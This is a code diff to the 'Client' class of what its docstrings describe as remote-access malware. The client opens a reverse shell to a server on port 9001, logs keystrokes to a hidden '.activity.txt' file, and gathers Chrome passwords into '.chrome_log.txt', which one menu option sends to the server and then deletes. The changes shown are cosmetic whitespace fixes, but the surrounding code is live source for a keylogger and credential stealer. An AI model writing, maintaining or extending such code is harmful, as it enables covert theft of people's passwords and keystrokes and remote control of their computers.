@@ -15,7 +15,7 @@ class Client:
         - Gets a reverse shell back to the server
     """
 
-    def __init__(self, host: str, port: int = 9001, file_port: int = 9002, keylog_filename: str = ".activity.txt", \
+    def __init__(self, host: str, port: int = 9001, file_port: int = 9002, keylog_filename: str = ".activity.txt",
                  chromepass_filename: str = ".chrome_log.txt") -> None:
         """
         Constructor
@@ -56,9 +56,9 @@ class Client:
         2. Starts logging key events to file
         3. Gets a reverse shell from client to server
         """
-        
+
         while 1:
-            
+
             # Try connection with Ctrl-C handling
             try:
                 choice = self.open_menu()
@@ -96,7 +96,6 @@ class Client:
             elif choice == 8:
                 self.send_file(self.chromepass_filename)
                 self.send_data("\n\n{} sent and deleted from client...".format(self.chromepass_filename), self.sock)
-            
 
     def open_menu(self) -> int:
         """
@@ -104,7 +103,7 @@ class Client:
         
         :returns: The choice of the menu
         """
-        
+
         response = ""
 
         # Opens menu
@@ -154,10 +153,10 @@ class Client:
 
         :returns: The received data
         """
-                
+
         # Wait until data is received
-        data = sock.recv(1024).decode("UTF-8") 
-            
+        data = sock.recv(1024).decode("UTF-8")
+
         return data
 
     def send_file(self, filename: str) -> None:
